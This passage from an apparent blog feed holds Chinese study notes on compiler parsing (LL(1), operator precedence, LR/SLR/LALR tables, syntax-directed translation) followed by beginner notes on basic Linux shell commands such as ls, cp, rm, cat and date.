果匹配成功，则去掉x1和y1（即指针后移一位）否则报错。 3.接受：当格局为(#, #）时，报告分析成功结束。 从实现的角度来说，上述替换过程需要花较多的时间，因为它除了把一个候选式替换掉x1,还需要x2 … xn统统进行移位处理，这时很麻烦的。我们的处理方法是用栈来保存x1x2 … xn,而且是把xn作为栈底， x1作为栈顶，那么上述的替换动作就简单了，只需在栈顶进行替换。即去掉x1把候选式的符号串按逆序方式压入栈中即可。 LL(1)方法的实现LL(1)方法在实现时用到一个LL(1)分析矩阵和一个分析栈以及预测分析程序。 分析矩阵的元素M[A,a]中的下标A为非终结符，a为终结符或句子结束标记”#”，矩阵元素M[A,a]的内容为一条关于A的产生式。 它表明当用非终结符A向下推导而当前输入符为a时，所应采用的候选式。当矩阵元素为空时，则表示用A往下推导时遇到了不应该出现的符号，即A与a不能匹配。因此应该转向出错处理。 预测分析程序如下图 ①判断文法G[E]是否为LL(1)文法，若文法中含有左递归那么要先消除左递归，然后求select集 ②构造预测分析表，对每个终结符或’#’号用a表示，则若a∈Select(A&rarr;α)。令 M[A,a]=A&rarr;α 把所有无定义的M[A,a]标上ERROR 伪代码如下： 12345678910111213141516171819其程序维护一个栈Stack用来储存非终结符，一个用于储存源程序的读入字符变量a，一个用于储存栈顶元素XX其中M[A,a] = &#123;X-&gt;x1x2……xk&#125; 为 Select(X-&gt;x1x2……xk)=&#123;a,……&#125;,X为非终结符,a为终结符#和开始符合入栈把第一个输入符号读入aFlag := Truewhile Flag Do:4把栈顶元素出栈到X中4if X ∈ VT then44if X = a then 把下一个输入符号读入a44else ERROR4else if X = '#' then 44 Flag := False 44 else ERROR4else if M[X,a] = &#123;X-&gt;x1x2x3……Xxk&#125; then444把x1x2x3……xk入栈4else ERROREND of whileSTOP/*分析成功，过程完毕*/ 自底向上语法分析原理：自左向右扫描，自下而上分析 从输入符号串入手，通过反复查找当前句型的可归约串，并使用文法的产生式把他归约成相应的非终结符来一步步地进行分析。最终把输入串归约成文法的开始符号，表明分析成功。 任何自下而上分析方法的关键就是要找出当前句型的可归约串，然后根据产生式判别将它归约成什么样的非终结符。 规范归约基本概念G为文法，S为开始符号，假定α，β，δ是G的一个句型，如果 S =*=&gt; αAδ 且 A=+=&gt; β， 则称 β 是句型 α β δ 相对于非终结符A的短语。 如果 A &rArr; β ，则称β是句型 α β δ 相对于A的直接短语。 最左直接短语称为句柄。 从句子到开始符号的归约序列，如果每一步都是把句柄替换为相应产生式的左部符号而得到的，则称为规范归约。规范归约是最右推导（规范推导）的逆过程。 例：：考虑文法G(E)：E→E +T |T T→T*F | F F→i| (E) 并假定输入串为（i+i)*i，考察自下而上的分析过程 栈上的候选式不一定是句柄。例如，在第14步对栈顶为T，它是E的一候选式，但它不是句柄，不能归约成E。判定候选式是极为简单的事情，但判定句柄就不那么容易。而不同的自底向上方法给出不同的判定方法。 自下而上方法包括四个方法： 移进(shift)：把输入流的头符读到分析栈中 归约(Reduction)：把分析栈顶的句柄归约为一非终结符 接受：分析成功 报错：处理错误 算符优先分析首先规定文法符号之间的优先关系和结合性质，然后再利用这种关系，通过比较两个相邻的符号之间的优先顺序来确定可归约串。 算符文法：任何产生式的右部都不含两个相继的非终结符 优先关系： 终结符ab的三种优先关系： a = b：当且仅当存在形如下面的产生式 U &rarr; … ab … 或 U &rarr; …aQb … a &lt; b：当且仅当存在形如下面的产生式 U &rarr; …aW… 的产生式，且有 W =+=&gt; b… a &gt; b：当且仅当存在形如下面的产生式 U &rarr; …Vb… 的产生式，且有 V=+=&gt;…a 或 V =*=&gt;…aQ 如何从文法构造优先关系表检查文法产生式的每个候选，可找出所有满足 = 的终结符对。 对于每个非终结符 P 构造两个集合 FIRSTVT(P) 和 LASTVT(P) FisrtVt(P) = { a | P =+=&gt; a… 或 P =+=&gt; Qa… ，a ∈ VT ，Q ∈ VN } LastVt(P) = { a | P =+=&gt; …a 或 P =+=&gt; …aQ ，a∈VT ，Q ∈ VN } 检查每个产生式的候选，若形如 …aP… ，则对任意b ∈ FisrtVt(P) ，我们有 a&lt;b 若形如 …Pb… ，则对任何a ∈ LastVt(P)，我们有 a&gt;b 对表达式文法的非终结符构造 FirstVt 和 LastVt 并建立优先关系表 算符优先分析算法素短语：这样的一个短语，他至少包含一个终结符，不含比自身更小的素短语 最左素短语：句型最左边的素短语 定理：算法优先文法的句型 #N1a1N2a2……NnanNn+1# 的最左素短语是满足如下条件的最左子串 Njaj……NiaiNi+1 ， aj-1 &lt; aj ， aj = aj+1 = ai ， ai &gt; ai+1 优先函数LR分析法 LR(K)分析是指自左向右扫描和自下而上的语法分析，且在分析的每一步，只须根据分析栈中当前已移进和归约出的全部文法符号，并至多再向前查看K个输入符号，就能确定相当于某一产生式右部符号的句柄是否已在分析栈的顶部形成。从而也就可以确定所应采取的分析动作（是移进输入符号还是按某产生式进行归约）。 1234567891011# X1X2 …… Xi …… Xn Xn+1 Xn+2 …… Xn+k Xn+k+1 …… #44 |-------||----------------|444 栈顶 扫描器的缓冲区 444 扫到Xn+1,向前查看k个符号,来确定是把Xn+1移进栈,还是把Xi…Xn作为句柄进行归约1) 要归约时，则根据某产生式 U → XiXi+1……Xn 进行归约: #X1X2 …… Xi-1 U Xn+1Xn+2 …… Xn+k …… #2)要移进时，即把Xn+1进栈，并读入下一符号: #X1X2 …… Xi …… XnXn+1 Xn+2 …… Xn+k …… #44444444444|---| |---| |-|44444444444栈中Xi 栈顶(Xn+1) 当前扫描符(Xn+2) LR(0)：表示再每一步分析时都不用向前输入符号 LR(1)：表示再每一步分析时都向前看一个输入符号来决定当前的动作 SLR(1)：表示简单的LR(1)，即只在动作不唯一的地方向前看一个符号，在动作唯一时则不向前看输入符号 LR分析器的逻辑结构及工作流程 如图为LR分析器的逻辑结构，所有LR分析器的总控程序大致相同，只有分析表（即Go-Action表）不相同。 规范LR分析表构造法：用此法构造的分析表功能最强而且也适合很多文法，但是实现代价较高 简单LR（即SLR）分析表构造法：比较容易实现的方法，但SLR分析表功能太弱，而且对某些文法可能根本就构造不出相应的SLR分析表 向前LR（即LALR）分析表构造法：这种方法构造的分析表功能介于规范LR分析表和SLR分析表之间。这种表适用于绝大多数的程序语言文法，而且也可以设法有效实现 LR的分析过程两个栈：状态栈，符号栈 移进： 归约： 接受&amp;报错： 所以各种LR分析器的最大区别在于其分析表，分析表决定了每一步该如何移进或者归约，直至接受，或者中途报错。 LR(0)分析表的构造1.规范句型的活前缀 前缀：一个符号串的前缀是指该串的任意首部(包括ε)。 ​ 例：abc的前缀为：ε，a，ab，abc 归约时，归约前和归约后的被归约部分与剩余部分合起来仅构成文法的规范句型，而用哪个产生式归约仅取决于当前句型的前面部分；X1X2…Xn[p]，其中Xi为文法的符号，[p]为第p个产生式序号 我们把规范句型的这种前端部分的串称为活前缀。实际上，它们恰好是符号栈栈顶形成句柄时符号栈中的内容。 活前缀：是指规范句型的一个前缀，这种前缀不含句柄之后的任何符号。 这是因为一旦句型的句柄在符号栈顶形成，将会立即被归约之故。所以我们将规范句型具有上述性质（不含句柄之后的任何符号）的前缀称之为活前缀。 在规范归约过程中的任何时候只要已分析过的部分即在符号栈中的符号串为规范句型的活前缀，表明输入串的已被分析过的部分是该文法某规范句型的一个正确部分。 定义：若 S=*R&rArr; αAω =R&rArr; αβω 是文法G的一个规范推导，如果符号串γ是 αβ 的前缀，则称γ是G的一个活前缀。其中S为文法开始符号 LR(0)项目 活前缀和句柄间的关系： (1) 活前缀中已含有句柄的全部符合（句柄的最后符号就是活前缀的最后符号） (2) 活前缀只含有句柄的前部分符号（句柄的最左子串为活前缀的最右子串） (3) 活前缀中全然不包括句柄的任何符号 (1) 表明：此时某一产生式 A &rarr; β 的右部 β 已出现在符号栈顶，因此此时相应的分析动作应当是用此产生式进行归约。 (2) 表明：形如 A &rarr; β1 β2 的产生式的右部子串已在符号栈栈顶了，如 β1 ，正期待着从余留输入串中能看到由β推出的符号串，即期待 β2 进栈以便能进行归约。故此时分析动作是移进当前输入符号 (3) 表明：期望从余留输入串中能看到某产生式 A &rarr; α 的右部，即α所代表的符号串（即句柄），所以此时分析的动作也是读输入符进符号栈。 在产生式的右部相应位置上加一个圆点 . ，来指示识别位置，标明在 . 前的部分已被识别 如 (1) A &rarr; β. (2) A &rarr; β1.β2 (3) A &rarr; .α 右部某位置上标有圆点的产生式称为LR(0)项目(item)。 不同的LR(0)项目，反映了分析过程中符号栈顶的不同情况。 每个项目的意义与圆点的位置有关 圆点左边的子串表示在分析过程的某一时刻用该产生式归约时句柄中已识别过的部分，圆点右边的子串表示待识别的部分 文法的全部LR(0)项目将是构造他的所有活前缀的有穷自动机的基础 LR(0)项目的分类 A → α.：表明右部符号串已出现在栈顶，此时相应的分析动作应当是按此产生式进行归约，此种项目称为规约项目。 S&#39; → S.：称为接受项目。 A → α.Xβ：其中α可以为ε，当X为终结符时，相应的分析动作应将当前的符号移入栈中，将此项目称为移进项目。 A → α.Xβ：其中α可以为ε，当X为非终结符时，期待从余留的输入符中进行归约后而得到X，此类项目称为待约项目。 把终结符和非终结符都可看成一个有限自动机的输入符号，每把一个符号进栈相当于已识别过该符号，而状态进行转换（到下一个状态），当识别到可归约前缀时相当于栈顶已形成句柄，则认为达到了识别句柄的终态。、 ==&gt;&gt;&gt;构造识别活前缀的DFA：DFA中的每一个状态由若干个LR(0)项目所组成的集合(称为项目集)来表示。 12345678910举例：构造识别前缀的DFA用I0表示这个DFA的初态，将项目S'→.S列入项目集I0。将项目S→.A和S→.B加入I0中。将A→.aAb和A→.c和B→.aBb, B→.d加入I0中。项目集I0将由如下项目组成：I0 : S'→.S, S→.A, S→.B, A→.aAb, A→.c, B→.aBd, B→.d&gt;&gt;&gt; S'→.S称为项目集I0的基本项目，从基本项目出发构造项目集I0的过程，可用closure(&#123;S'→.S&#125;)表示。 closure(I)的定义:Closure(I) = I ∪ { A → .μ | A → μ∈G ∧ K→ α.Aβ∈closure(I) ∧ α∈V∧β∈V} 构造closure(I)的算法:1）I 中的每一个项目都属于 closure(I)2）若形如 K→α.Aβ 的项目属于I，且 A→μ 是文法的一个产生式，任何形如 A→.μ 的项目也应加到 closure(I) 中3）重复上述过程，直至不再有新的项目加入到closure(I)中为止。 如何确定从I0可能转移到的下一状态？ 若I0中有项目 K→a .Ab，从输入串识别出A后，进入下一状态。设此状态为 Ii ，显然 Ii 中必含有形如 K→aA .b 的项目，称为 K→a .Ab 的后继项目。后继项目组成集合 J，则J中的每个项目都是项目集 Ii 的基本项目，有： Ii =closure( J ) 定义状态转移函数：GOTO(I,A)=closure(J)其中，I 是当前状态，A为文法符号，J 是 I 中所有形如K→a.Ab的项目之后继项目K→aA.b所组成的集合，而closure(J)就是项目集 I（即状态I)关于符号A的后继项目集（即后继状态）。 将G[S’]的全部项目集称为文法G[S’]的LR(0)项目集规范族，并记为C=(I0 ，I1 ，I2 ，……，In ) 识别文法G[S’]的全部活前缀的DFA为 M = ( C，V，GoTo ， I0 ， Z ) 其中，C：M的状态集，即文法G[S’] 的LR(0) 项目集规范族 I0 ~~~ In V：M的字母表，即在M中的所有符号 GoTo：M的状态转换函数，即上述的GoTo函数 I0 ：M的唯一初态 Z：M的终态集，Z &sub; C 为规范族中所有含有规约项目的那些项目集 例如下图： 12345678文法G':(0) S' → S(1) S → A(2) S → B(3) A → aAb(4) A → c(5) B → aBd(6) B → d 如上为一个DFA，通过读入字符进行状态转换，以及在每个状态内进行closure闭包。 LR(0)分析表构造要求每一个项目集中的的诸项目不出现下列的情况： （1）移进项目和归约项目并存，即存在移进—归约冲突； （2）多个归约项目并存，即存在归约—归约冲突。 ​ 如果一个文法G满足上述条件，也就是它的每个LR(0)项目集中都不含有冲突的项目，则称G为LR(0)文法。 只有当一个文法是LR(0)文法时，才能对它构造不含冲突动作的LR(0)分析表。 1234567891011121314151617181920212223242526构造LR(0)分析表的算法为： (1)对于每一项目集Ii中形如A→α.Xβ的项目，且有GO(Ii,X)=Ij,444若X为一终结符号 a 时，则置ACTION[i,a]=Sj;444若X为一非终结符号时，则置GOTO[i,X]=j (2)若Ii中有归约项目A→α. ,设A→α为文法第j个产生式，则对文法的任何终结符和“#”（均记为a）,置ACTION[i,a]=Rj (3)若接受项目S'→S .属于Ii ,则置ACTION[i,#]=acc。4 (4)在分析表中,凡不能按上述规则填入信息的元素,均置为“出错”。4 如上图的DFA可构造分析表为: ACTION GOTO44a b c d # S A B0 S4 S5 S6 1 2 31 Acc2 R1 R1 R1 R1 R13 R2 R2 R2 R2 R24 S4 S5 S6 7 95 R4 R4 R4 R4 R46 R6 R6 R6 R6 R67 S88 R3 R3 R3 R3 R39 S1010 R5 R5 R5 R5 R5&gt;&gt;&gt; 表中Ri代表用第i个产生式归约,Si代表移进Action表的第i行 分析器的工作过程如下： 根据输入串当前符号 a 和 分析栈栈顶状态 i 查找分析表应采取的动作： 1）若ACTION[i,a]=Sj, a∈VT ,则把 a 移进符号栈， j 移进状态栈。 2）若ACTION[i,a]=Rj，a∈VT 或 # ，则用第j个产生式归约。并将两个栈的指针减去K(其中，K为第j 个产生式右部的串长度），并把产生式的左部符号A压入符号栈，同时用符号对（ Si-k , A )去查GOTO表（其中Si-k 为状态栈当前栈顶元素，若 GOTO[Si-k ,A] = j ,则j压入状态栈，使得两个栈内的元素一样多。 3）若ACTION[i,a]=Acc,（此时a应为“#”号），则表明分析成功，结束分析。 4）若ACTION[i,a]=空白，转出错处理。 SLR分析表构造大多数程序设计语言的文法不是LR(0)文法。 对LR(0)规范族中有冲突的项目集（状态）用向前查 看一个（输入）符号的办法进行处理，以解决冲突。即为SLR(1)。 SLR(1) 分析表构造与LR(0) 分析表构造基本相同 SLR(1) 之所以是1，是因为向前看了一步Follow集。 12345678910111213假定有一个LR(0)规范族中含有如下项目集(状态)I:I=&#123;X→a.bβ , A→g. , B→d.&#125;其中a,b,g,d为符号串，b∈VT ,I中含有移进—归约和归约—归约冲突。只要FOLLOW(A)和FOLLOW(B)互不相交，且都不包含b,即:FOLLOW(A)∩FOLLOW(B)=φFOLLOW(A)∩&#123;b&#125;=φFOLLOW(B)∩&#123;b&#125;=φ当状态I面临某输入符号a时，则动作为：1）若a = b,则移进。2）若a ∈ FOLLOW(A),则用产生式A→g归约。3）若a ∈ FOLLOW(B),则用产生式B→d归约。 一般地，对于LR(0)规范族的一个项目集I可能含有多个移进项目和多个归约项目，我们可假设项目集I中有m个移进项目： A1→a1. b1b1, A2→ a2. b2b2, …, Am→ am. bmbm;同时含有n个归约项目：B1→g1. , B2→ g2. ,…, Bn→ gn. ,只要集合{b1, b2,…bm}和FOLLOW(B1),FOLLOW(B2),…,FOLLOW(Bn) 两两交集都为空，则我们仍可用上述归则来解决冲突： 1）若a∈{b1, b2,…,bm},则移进。 2）若a∈FOLLOW(Bi),i=1,…,n，则用 Bi→ gi 进行归约。 3）此外，则报错。 SLR分析表构造方法(1) 对于每一项目集Ii中形如A.X的项目，且有GOTO(Ii,X)=Ij, 若X为一终结符号a时，则置ACTION[I,a]=S; 若X为一非终结符号时，则仅置GOTO[i,X]=j； (2) 若归约项目A→α. 属于Ii,设A→α为文法第j个行产生式，则对任何属于FOLLOW(A)的输入符号a,置ACTION[i,a]=Rj； (3) 若接受项目S’ → S.属于Ii ,则置ACTION[i,#]=acc。 (4) 在分析表,凡不能按上述规则填入信息的元素,均置为“出错”。 （例：TODO：后面补充，ppt–Bottom-Up–P42-47） 规范LR分析表构造SLR(1) 方法：若状态K含有 A ➡ α.，若 α ∈ Follow(A) ，则用 A ➡ α. 归约 当状态Ix下，有产生式A ➡ α. 和A ➡ α. = …，此时，SLR(0)不知道是将此归约成A还是移进至=，若没有其他情况能产生=，则这里产生移进归约冲突，导致错误！！！ LR(1)项目(A→a. β，x) 表示： a在栈顶，输入串头部可由βx导出。 LR(1)的状态：LR(1)项目的集合 12345678910111213141516该算法为: 令初态: Closure( (S’→.S，#) ) Closure(I)= repeat for any item( A→α.Xβ ，z) in I for any production X →γ for any w∈FIRST(βz) I←I∪&#123;X → .γ, w&#125; until I does not changeGO (I,X)= J ←&#123;&#125; for any item(A→α.Xβ，z) in I add ( A→αX.β，z ) to J return Closure(J) LALR分析表的构造同心项目集：除去搜索符之外都相同的LR(1)项目集 合并同心项目集不会产生新的移进-归约冲突 将 LR(1) 合并同心项目集，如果没有归约-归约冲突，则为LALR(1)文法。 参考，各语法分析器的区别 各文法的区别： LL(1)就是向前只搜索1个符号，即与FIRST()匹配，如果FIRST为空则还要考虑Follow集 >&gt;&gt;见到First集就移进，见到Follow集就归约。 LR(0):见到First集就移进，见到终态就归约 SLR(1)见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。 >&gt;&gt;SLR分析法包含的展望信息是体现在利用了Follow(A)信息，可以解决“归约－归约”冲突 SLR分析法没有包含足够的展望信息，不能完成解决“移进－归约”冲突，需要改进。 LALR同心集合并不会产生“移进－归约”冲突 ，但会产生“归约－归约”冲突 LR(1) 语法制导的翻译（Syntax-Directed Translation）一种语义描述方法：语法制导的翻译 语法制导翻译采用上下文无关文法来引导对语言的翻译，是一种面向文法的翻译技术 语法制导翻译=语法分析+语义分析+中间代码生成 语义翻译 = 语义分析 + 中间代码生成 属性文法如何表示语义信息？为文法符号设置语义属性，用来表示语法成分对应的语义信息。 语法制导定义：是对上下文无关文法的推广，将每个文法符号和一个语义属性集合相关联，将每个产生式和一组语义规则相关联，这些用于计算该产生式中各文法符号的属性值 属性文法定义的形式 基础文法 每个文法符号有一组属性 每个文法产生式 A ➡ α 有一组形式为 b := f(c1,c2,……,ck) 的语义规则，其中 f 是函数，b和c1,c2,……,ck是该产生式文法符号的属性 综合属性：如果b是A的属性，c1,c2……,ck是产生式右部文法符号的属性或A的其他属性 继承属性：如果b是产生式右部某个文法符号X的属性 文法符号的属性分为：综合属性和继承属性。 综合属性（Synthesized Attribute）S属性定义：仅仅使用综合属性的语法制导定义 例： 语法分析树如下 分析树的各节点属性的计算自下而上完成 继承属性（Inherited Attribute）例：语法规则如下： 分析树如下： 分析树的依赖图如下 其中，L ➡ L1 ，id ； L1.in := L.in；addtype(id.entry , L.in)； 基于属性文法的处理方法属性计算次序拓扑排序：节点的一种顺序，是的边只会从该次序中先出现的节点到后出现的节点 ①构造输入的分析树，②构造属性依赖图，③对节点进行拓扑排序，④按拓扑排序的次序计算属性。 当然，也可以多次扫描分析树，如果属性文法不存在循环依赖，每次至少会计算出一个属性值，但是编译更偏向于一边扫描的处理方法。 抽象语法树 语法分析与语义处理阶段分离 语法分析树不适合语义处理的因素： 提取公共左因子 消除左递归等引入新的产生式和符号、标点等语法要素不含任何语义信息 抽象语法树是语法分析和后续阶段的接口 S属性文法的自下而上的计算将LR分析器增加一个域来保存综合属性值 L属性文法的自上而下的计算 —边分析边翻译的方式能否用于继承属性 属性的计算次序一定受分析方法所限定的分析树结点建立次序的限制 分析树的节点是自左向右生成 如果属性信息是自左向右流动，那么有可能在分析的同时完成属性计算。 L属性的定义如果每个产生式 A ➡ X1X2…Xn 的每条语义规则计算的属性是A的综合属性；或者Xj (1≤j≤n)的继承属性，但他仅依赖①该产生式中Xj 左边符号 X1X2…Xj-1 的属性；②A的继承属性 变量类型声明的语法制导定义是一个L属性定义 翻译方案，例：把有加减的中缀表达式翻译成后缀表达式，如果是8+5-2，则输出8 5 + 2 - 12345678910E ➡ T RR ➡ addop T &#123;print(addop.lexeme)&#125; R1 | εT ➡ num &#123;print(num.val)&#125;如 8+5-2可翻译成:4E ⇒ T R ⇒ num &#123;print (8)&#125; R4 ⇒ num&#123;print (8)&#125;addop T&#123;print (+)&#125;R4 ⇒ num&#123;print(8)&#125;addop num&#123;print(5)&#125;&#123;print (+)&#125;R4 … &#123;print(8)&#125;&#123;print(5)&#125;&#123;print(+)&#125;addop T&#123;print(-)&#125; R … &#123;print(8)&#125;&#123;print(5)&#125;&#123;print(+)&#125;&#123;print(2)&#125;&#123;print(-)&#125; 预测翻译器的设计把预测分析器的构造方法推广到翻译方案的实现 12345678910如:产生式R ➡ +TR | ε 的分析过程procedure R;4begin44if lookahead = '+' then begin444match ('+');T;R;44end44else begin /*Do nothing*/4endend 语义规则的两种描述方法：属性文法和翻译方案 S属性的自下而上计算（边分析便计算） L属性的自上而下计算（边分析便计算） L属性的自下而上计算（边分析便计算） 中间代码生成代码优化代码改进变换的原则 （1）等价原则。经过优化后不应改变程序运行的结果。 （2）有效原则。使优化后所产生的目标代码运行时间较短，占用的存储空间较小。 （3）合算原则。应尽可能以较低的代价取得较好的优化效果。 优化：①公共子表达式删除②复写传播③死代码删除④代码外提⑤强度削弱和归纳变量删除 基本块：连续的语句序列，控制流从他的开始进入，并从他的末尾离开]]></content>
      <categories>
        <category>Compiler</category>
      </categories>
      <tags>
        <tag>StudyNote</tag>
        <tag>Compilier</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Note]]></title>
    <url>%2F2019%2F08%2F22%2FLinux-Command%2F</url>
    <content type="text"><![CDATA[Linux Study Note 参考： 黑马程序员-linux从入门到精通 Linux系统的文件linux一切皆文件 文件操作种类：创建文件、编辑文件、保存文件、关闭文件、重命名文件、删除文件、恢复文件 文件目录结构Bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。 Dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要挂载（类似windows下的分配盘符。 Etc：该目录主要存储一些配置文件。 Home：表示“家”，表示除了root用户以外其他用户的家目录，类似于windows下的User/用户目录。 Proc：process，表示进程，该目录中存储的是Linux运行时候的进程。 Root：该目录是root用户自己的家目录。 Sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。 Tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。 Usr：全称是User Software Resource，注意不是user的缩写。存放的是用户自己安装的软件。类似于windows下的program files。 Var：存放的程序/系统的日志文件的目录。 Mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。 Linux的基本指令linux指令指在linux终端（命令行）中输入的内容。 一个完整的指令的标准格式：Linux通用的格式 1#指令主体 (空格) [选项] (空格) [操作对象] 一个指令可以包含多个选项，操作对象也可以是多个。 1.ls指令含义：ls（list） 用法1：#ls含义：列出当前工作目录下的所有文件/文件夹的名称 用法2：#ls 路径含义：列出指定路径下的所有文件/文件夹的名称 路径分为相对路径和绝对路径 用法3：#ls 选项 路径含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。 常见的语法： 12#ls -l 路径#ls -la 路径 选项解释： ​ -l：表示list，表示以详细列表的形式进行展示 ​ -a：表示all，显示所有的文件/文件夹（包含了隐藏文件/文件夹） 上述列表中的第一列表示文档类型，其中 “ - ” 表示改行对应的文档类型为文件，“ d ” 表示文档类型为文件夹。 在Linux中，隐藏文档一般以 “ . ” 开头。 用法4：#ls -lh 路径含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示 ls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限 2.pwd指令用法：#pwd （print working directory，打印当前工作目录） 3.cd指令命令：#cd （change directory，改变目录） 作用：用于切换当前的工作目录 语法：#cd 路径P.S. 在linux中有一个特殊符号~，用于表示当前用户的家目录 4.mkdir指令指令：mkdir （make directory，创建目录） 语法1：#mkdir 路径路径，可以是文件夹名称也可以是包含名称的一个完整路径 假如是文件夹名称，则在当前目录下创建该文件夹 语法2：#mkdir -p 路径含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错 语法3：#mkdir 路径1 路径2 路径3 …表示一次性创建多个目录 5.touch指令作用：创建文件 语法：#touch 文件路径 路径可以是直接的文件名也可以是路径 一次性创建多个文件 6.cp指令指令含义：cp （copy，复制） 作用：复制文件/文件夹到指定位置 语法：#cp 被复制的文档路径 文档被复制到的路径简单来说就是#cp 源地址 目的地址 注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。 当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”（-r表示递归复制），否则目录将被忽略 7.mv指令指令含义：mv （move，移动，剪切） 作用：移动文档到新的位置 语法：#mv 需要移动的文件路径 需要保存的位置路径 注：在Linux中重命名的命令也是mv，语法和移动语法一样。 8.rm指令指令含义：rm （remove，移除，删除） 语法：#rm 选项 需要移除的文件路径选项： -f：force，强制删除，不提示是否删除 ​ -r：表示递归 在删除的时候如果不带选项，会提示是否删除，如果需要确认则输入“y/yes”，否则输入 注意：如果在删除的时候不想频繁的确认，则可以在指令中添加选项“-f”，表示force（强制）。 删除一个文件夹： 注意：删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项。 删除多个文件： 删除一个目录下具有公共特性的文件，例如都以Linux开头 其中*称之为通配符，意思表示任意的字符，Linux*，则表示只要文件以Linux开头，后续字符则不管。 9.vim指令指令：vim （Vim是一款文本编辑器，号称编辑器之神） 语法：#vim 文件路径作用：可以打开一个文件，文件不存在时，可以创建该文件 vim其他用法参考本文后续。 10.输出重定向一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。 >：覆输出，会覆盖掉原先的文件内容 >&gt;：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加 语法：#正常执行的指令 &gt; / &gt;&gt;文件的路径注意：文件可以不存在，不存在则新建 11.cat指令作用1：cat有直接打开一个文件的功能。 语法1：#cat 文件的路径 作用2：cat还可以对文件惊醒合并 语法2：#cat 待合并的文件路径1 待合并的文件路径2 … 文件路径n &gt; 合并之后的文件路径 12.df指令作用：查看磁盘空间 语法：#df -h-h表示以较高可读性的形式展示大小 13.free指令作用：查看内存使用情况 语法：#free -m-m表示以mb为单位查看 剩余的真实可用的内存为1665mb。 Swap：用于临时内存，当系统真实内存不够用的时候可以临时使用磁盘空间来充当内存。 14.head指令作用：查看一个文件的前n行，若不指定n，则默认显示前10行。 语法：#head -n 文件路径n表示数字 15.tail指令作用1：查看一个文件的末n行，如果n不指定，则默认显示后10行 语法：#tail -n 文件路径n表示数字 作用2：可以通过tail指令来查看一个文件的动态变化内容（变化的内容不能是用户手动添加的） 语法：#tail -f 文件路径该命令一般用于查看系统的日志比较多 16.less指令作用：查看文件，以较少的内容进行输出，按下辅助功能键（数字+回车，空格键+上下方向键）查看更多 语法：#less 需要查看的文件路径 退出的时候只需要按下q键 17.wc指令作用：统计文件内容信息（包含行数、单词数、字节数） 语法：#wc -lwc 需要统计的文件路径-l：表示lines，行数 -w：表示words，单词数，依照空格来判断单词数量 -c：表示bytes，字节数 18.date指令作用：表示操作时间日期（读取、设置） 语法1：#date输出的形式：2019年8月24日 星期六 20:13:14 语法2：#date +%F （等价于 #date “+%Y-%m-%d”）输出形式：2019-08-24 语法3：#date “+%F %T” （等价于 #date “+%Y-%m-%d %H:%M:%S”）引号表示让“年月日与时分秒”成为一个不可分割的整体 输出的形式：2019-08-24 20:13:14 语法4：#date -d “-1 day” “+%Y-%m-%d %H:%M:%S”用于获取之前或者之后的某个时间（备份） 符号的可选值：+（之后）、-（之前） 单位的可选值：day（天）、month（月份）、year（年）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162%F：表示完整的年月日%T：表示完整的时分秒%Y：表示四位年份%m：表示两位月份（带前导0）%d：表示日期（带前导0）%H：表示小时（带前导0）%M：表示分钟（带前导0）%S：表示秒数（带前导0）(以下摘自#date --help) %% 一个文字的 % %a 当前locale 的星期名缩写(例如： 日，代表星期日) %A 当前locale 的星期名全称 (如：星期日) %b 当前locale 的月名缩写 (如：一，代表一月) %B 当前locale 的月名全称 (如：一月) %c 当前locale 的日期和时间 (如：2005年3月3日 星期四 23:05:25) %C 世纪；比如 %Y，通常为省略当前年份的后两位数字(例如：20) %d 按月计的日期(例如：01) %D 按月计的日期；等于%m/%d/%y %e 按月计的日期，添加空格，等于%_d %F 完整日期格式，等价于 %Y-%m-%d %g ISO-8601 格式年份的最后两位 (参见%G) %G ISO-8601 格式年份 (参见%V)，一般只和 %V 结合使用 %h 等于%b %H 小时(00-23) %I 小时(00-12) %j 按年计的日期(001-366) %k hour, space padded ( 0..23); same as %_H %l hour, space padded ( 1..12); same as %_I %m month (01..12) %M minute (00..59) %n 换行 %N 纳秒(000000000-999999999) %p 当前locale 下的"上午"或者"下午"，未知时输出为空 %P 与%p 类似，但是输出小写字母 %r 当前locale 下的 12 小时时钟时间 (如：11:11:04 下午) %R 24 小时时间的时和分，等价于 %H:%M %s 自UTC 时间 1970-01-01 00:00:00 以来所经过的秒数 %S 秒(00-60) %t 输出制表符 Tab %T 时间，等于%H:%M:%S %u 星期，1 代表星期一 %U 一年中的第几周，以周日为每星期第一天(00-53) %V ISO-8601 格式规范下的一年中第几周，以周一为每星期第一天(01-53) %w 一星期中的第几日(0-6)，0 代表周一 %W 一年中的第几周，以周一为每星期第一天(00-53) %x 当前locale 下的日期描述 (如：12/31/99) %X 当前locale 下的时间描述 (如：23:13:48) %y 年份最后两位数位 (00-99) %Y 年份 %z +hhmm 数字时区(例如，-0400) %:z +hh:mm 数字时区(例如，-04:00) %::z +hh:mm:ss 数字时区(例如，-04:00:00) %:::z 数字时区带有必要的精度 (例如，-04，+05:30) %Z 按字母表排序的时区缩写 (例如，EDT) 19.cal指令作用：用来操作日历的 语法1：#cal （等价于#cal -l）直接输出当前月份日历 语法2：#cal -3表示输出上一个月+本月+下个月的日历 语法3：#cal -y 年份表示输出某一个年份的日历 20.clear | (ctrl+L) 指令作用：清除终端中已经存在的命令和结果（信息） 语法：#clear 或 快捷键 ctrl + 